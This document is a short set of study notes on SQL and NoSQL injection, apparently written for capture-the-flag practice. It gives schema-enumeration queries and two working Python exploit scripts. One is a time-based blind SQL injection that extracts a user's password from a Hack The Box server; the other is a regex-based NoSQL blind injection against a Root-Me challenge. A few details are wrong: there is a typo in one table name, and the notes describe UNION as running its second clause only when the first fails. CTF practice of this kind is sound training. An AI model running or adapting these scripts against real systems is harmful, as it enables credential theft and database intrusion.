# SQL Injection
## 1. SQL
### 1.1. Overview
- syntax to comment: `--`, `/* */`, ...
- union: 
```
SELECT column_name(s) FROM table1 -> clause 1
UNION
SELECT column_name(s) FROM table2 -> clause 2
```
-> when clause 1 fail, will execute clause 2
- group_concat: string concatenation

### 1.2. Sqlite
- `select sql from sqlite_master`
-> show schema

### 1.3. Mysql
`select table_name from information_schema.tables where table_schema=database()`
-> show name of tables
`select column_name from information_sche.columns where table_schema=table_name`
-> show columns name of that table

### 1.4. Cheetsheet 
`https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection`

## 2. Attack
### 2.1. SQL injection boolean
- injection to query to bypass 

### 2.2. SQL injection blind
- base on response as like as error, timeout to collect data
example:
```
import requests, string, time
arr = "_}"+ string.digits+ string.ascii_letters  + string.punctuation
s = requests.session()
url = 'http://188.166.173.208:30042/api/list'

def bind(step):
    for char in arr:
        a = time.time()
        s.post(url,data={'order':f"(select case when (select ascii(mid((select password from users  where username='flagholder'),{step},1))) LIKE {ord(char)} then sleep(0.6) else 1 end)"})
        b = time.time()
        if b-a > 4:
            return char
    return None        

def flag():
    flag = 'HTB{'
    step = len(flag) + 1 
    while True:
        c = bind(step)
        if c==None or c=='}':
            return flag + c
            
        flag += c 
        step += 1
        print('[+] flag = ',flag)

print('[+] flag = ',flag())
```

## Nosql injection
```
import requests, string
arr = string.digits + string.ascii_letters + "_@{}-/()!\"$%=^[]:;"
req = requests.session()

def countchar() -> int:
    for i in range(2,50):
        res = req.get('http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=%s'%(i*'.')).text
        if 'This is not a valid flag for the'  in res:    
            return i 

def findpassword( n : int) -> str:
    password = ''
    for _ in range(n):
        for c in arr:
            if 'Yeah this is the flag for' in req.get('http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=^' + password + c).text:
                print('[+] ',password)
                password += c
                break
    return password


n = countchar()
print('length password ',n)
print(findpassword(n))
```